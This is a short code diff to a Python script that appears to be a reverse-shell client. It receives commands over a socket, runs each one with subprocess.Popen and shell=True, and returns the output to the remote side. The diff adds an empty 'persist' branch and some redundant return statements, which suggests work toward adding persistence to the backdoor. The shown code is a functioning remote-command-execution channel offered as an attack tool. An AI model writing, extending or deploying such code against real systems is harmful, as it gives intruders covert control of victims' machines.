@@ -24,6 +24,8 @@ def session_handler(sock, target_ip, target_port):
             print('[-] The server has terminated the session.')
             sock.close()
             break
+        elif message == 'persist':
+            pass
         process_message(sock, message)
 
 
@@ -34,6 +36,7 @@ def process_message(sock, message):
         pass
     else:
         execute_command(sock, message)
+        return
 
 
 def change_directory(sock, message):
@@ -51,6 +54,7 @@ def execute_command(sock, message):
     command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = command.stdout.read() + command.stderr.read()
     outbound(sock, output.decode())
+    return
 
 
 def inbound(sock):
